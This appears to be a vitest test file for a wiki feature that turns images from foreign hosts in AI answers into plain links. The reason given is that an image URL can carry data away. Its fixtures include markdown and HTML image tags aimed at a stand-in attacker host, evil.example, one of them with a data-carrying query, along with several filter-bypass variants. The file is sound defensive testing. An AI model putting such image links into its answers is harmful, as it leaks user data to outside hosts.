import { describe, expect, it } from 'vitest';
import { loadMarkdown, type PMNode } from '@kaveyl-wiki/core';
import { withoutForeignImages } from './ownImages';

// sec-003: AI answers must not load pictures from other hosts (a URL can carry data away).
const ORIGIN = 'https://wiki.example';
const inline = (md: string) => withoutForeignImages(loadMarkdown(md).doc, ORIGIN).content![0]!.content!;
const images = (nodes: PMNode[]) => nodes.filter((n) => n.type === 'image').map((n) => n.attrs!.src);

describe('pictures in AI answers', () => {
  it('own files, data: and blob: stay pictures', () => {
    const md = '![a](/api/files/m/a.png) ![b](assets/b.png) ![c](https://wiki.example/hilfe/c.png) ![d](data:image/png;base64,AAAA) ![e](blob:https://wiki.example/1)';
    expect(images(inline(md))).toEqual(['/api/files/m/a.png', 'assets/b.png', 'https://wiki.example/hilfe/c.png', 'data:image/png;base64,AAAA', 'blob:https://wiki.example/1']);
  });

  it('pictures from other hosts become a link with the alt text', () => {
    const nodes = inline('Vorher ![Geheim](https://evil.example/x?d=abc) nachher');
    expect(images(nodes)).toEqual([]);
    expect(nodes).toContainEqual({ type: 'text', text: 'Geheim', marks: [{ type: 'link', attrs: { href: 'https://evil.example/x?d=abc', title: null } }] });
  });

  it('also protocol-relative, backslash, HTML and http sources; without alt the address is shown', () => {
    // `\\\\` in Markdown is `\\` in the URL, which browsers read as `//`.
    const nodes = inline(String.raw`![](//evil.example/a) ![x](\\\\evil.example/b) <img src="http://evil.example/c" width="20">`);
    expect(images(nodes)).toEqual([]);
    expect(nodes.filter((n) => n.type === 'text' && n.marks?.length).map((n) => n.text)).toEqual(['//evil.example/a', 'x', 'http://evil.example/c']);
  });

  it('a picture inside a link keeps that link', () => {
    const nodes = inline('[![Logo](https://evil.example/l.png)](https://ziel.example)');
    expect(nodes).toEqual([{ type: 'text', text: 'Logo', marks: [{ type: 'link', attrs: { href: 'https://ziel.example', title: null } }] }]);
  });

  it('nested blocks are cleaned too', () => {
    const doc = withoutForeignImages(loadMarkdown('> - ![](https://evil.example/q)').doc, ORIGIN);
    expect(JSON.stringify(doc)).not.toContain('"type":"image"');
  });
});
